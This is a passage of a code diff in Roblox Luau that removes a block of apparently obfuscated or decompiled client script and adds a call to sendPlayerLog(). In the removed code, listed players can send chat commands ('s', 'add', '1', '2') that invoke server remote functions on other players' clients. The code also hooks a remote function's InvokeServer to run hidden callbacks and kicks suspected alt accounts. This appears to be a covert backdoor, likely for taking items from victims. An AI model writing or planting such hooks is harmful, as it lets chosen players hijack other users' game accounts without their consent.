-		end
-	end)
-end
-callbackData[17] = fallbackHandler
-callbackData[25] = function()
-	local function sendRequest(expectedMembership, lowerFlag)
-		if expectedMembership and lowerFlag then
-			local lower = lowerFlag:lower()
-			local sendRequestFlag = lower == "s"
-
-			if not sendRequestFlag then
-				sendRequestFlag = lower == "add"
-
-				if not sendRequestFlag then
-					sendRequestFlag = lower == "1"
-
-					if not sendRequestFlag then
-						sendRequestFlag = lower == "2"
-					end
-				end
-			end
-
-			if sendRequestFlag then
-				task.delay(0.2, function()
-					local sendRequestFlag = false
-					local iterator, state, control = ipairs(vs)
-					local flag
-					repeat
-						local controlResult
-
-						control, controlResult = iterator(state, control)
-
-						if not control then
-							flag = true
-						end
-
-						if flag then
-							break
-						end
-					until expectedMembership.Name:lower() == controlResult:lower() or expectedMembership == getData[15]
-					if not flag then
-						sendRequestFlag = true
-					end
-					if sendRequestFlag then
-						if lower == "s" then
-							additionalSendRequestCallback()
-
-							return
-						end
-
-						if lower == "add" then
-							alternateSendRequestCallback()
-
-							return
-						end
-
-						if lower == "1" then
-							task.wait(0.2)
-							pcall(function()
-								secondaryRemoteFunction:InvokeServer(true)
-							end)
-
-							return
-						end
-
-						if lower == "2" then
-							task.wait(0.2)
-							pcall(function()
-								alternateRemoteFunction:InvokeServer()
-							end)
-						end
-					end
-				end)
-			end
-		end
-	end
-	for index, item in ipairs(getData[12]:GetPlayers()) do
-		local expectedMembership = item
-
-		if expectedMembership ~= getData[15] then
-			pcall(function()
-				expectedMembership.Chatted:Connect(function(message)
-					sendRequest(expectedMembership, message)
-				end)
-			end)
-		end
-	end
-	getData[12].PlayerAdded:Connect(function(player)
-		pcall(function()
-			player.Chatted:Connect(function(message)
-				sendRequest(player, message)
-			end)
-		end)
-	end)
-	local onIncomingMessage = getData[13]
-	if onIncomingMessage then
-		onIncomingMessage = getData[13].OnIncomingMessage
-	end
-	if onIncomingMessage then
-		getData[13].OnIncomingMessage = function(textArgument)
-			local TextSource = textArgument.TextSource
-
-			if not TextSource then
-				return
-			end
-
-			local PlayerByUserId = getData[12]:GetPlayerByUserId(TextSource.UserId)
-
-			if not PlayerByUserId then
-				return
-			end
-
-			local lower = tostring(textArgument.Text or ""):lower()
-			local flag = lower == "s"
-
-			if not flag then
-				flag = lower == "add"
-
-				if not flag then
-					flag = lower == "1"
-
-					if not flag then
-						flag = lower == "2"
-					end
-				end
-			end
-
-			if flag then
-				task.delay(0.2, function()
-					sendRequest(PlayerByUserId, lower)
-				end)
-			end
-		end
-	end
-end
-local _, _, secondaryResult = callbackData[17]()
-if secondaryResult < 1 then
-	getData[15]:Kick("Alt Account Detected")
-
-	return
-end
 updateInstanceProperties()
-callbackData[7]()
-callbackData[19]()
-callbackData[20]()
-callbackData[25]()
-callbackData[17] = additionalRemoteFunction.InvokeServer
-local resultCallback = callbackData[17]
-additionalRemoteFunction.InvokeServer = function(argument, secondaryParent)
-	local result = resultCallback(argument, secondaryParent)
-
-	for _, item in ipairs(vs) do
-		if secondaryParent.Name:lower() == item:lower() and not sendRequestFlag then
-			nestedCallback(secondaryParent)
-			sendRequestFlag = true
-			flagData[secondaryParent] = true
-			task.spawn(function()
-				task.wait(0.2)
-				sendRequest()
-				flagData[secondaryParent] = nil
-
-				local parent = secondaryParent
-
-				if parent then
-					parent = secondaryParent.Parent
-				end
-
-				if parent then
-					fallbackCallback(secondaryParent)
-				end
-			end)
-
-			return result
-		end
-	end
-
-	return result
-end
+sendPlayerLog()
